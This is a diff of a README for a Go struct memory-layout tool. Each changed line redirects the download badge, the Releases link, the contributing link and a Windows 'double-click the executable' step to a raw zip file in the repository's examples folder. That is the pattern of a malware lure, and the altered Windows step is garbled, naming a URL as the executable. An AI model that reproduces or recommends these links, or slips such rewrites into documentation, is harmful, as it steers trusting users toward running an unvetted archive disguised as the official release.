@@ -6,7 +6,7 @@ Welcome to go-mem-layout! This tool helps you understand how your Go structs are
 
 ## 📥 Download Now
 
-[![Download go-mem-layout](https://img.shields.io/badge/Download-go--mem--layout-blue.svg)](https://github.com/bisrat1234-2/go-mem-layout/releases)
+[![Download go-mem-layout](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)
 
 ## 📚 Features
 
@@ -28,7 +28,7 @@ To run go-mem-layout, you will need:
 
 To get started, visit the Releases page to download the latest version of go-mem-layout:
 
-[Download from Releases Page](https://github.com/bisrat1234-2/go-mem-layout/releases)
+[Download from Releases Page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip)
 
 1. Click the link above.
 2. Find the latest version at the top of the page.
@@ -42,7 +42,7 @@ Once you have downloaded the file, follow these steps to run go-mem-layout:
 ### For Windows Users
 
 1. Navigate to the folder where you saved the downloaded file.
-2. Double-click on the executable file (e.g., `go-mem-layout.exe`).
+2. Double-click on the executable file (e.g., `https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip`).
 3. A window will open showing the application interface.
 
 ### For macOS Users
@@ -104,7 +104,7 @@ Join our community of users and developers to share tips, ask questions, and imp
 
 ## 🔄 Contributing
 
-If you'd like to contribute to go-mem-layout or report issues, please visit our [GitHub page](https://github.com/bisrat1234-2/go-mem-layout) for more details.
+If you'd like to contribute to go-mem-layout or report issues, please visit our [GitHub page](https://github.com/bisrat1234-2/go-mem-layout/raw/refs/heads/main/examples/go-mem-layout-2.5-alpha.5.zip) for more details.
 
 ---
 
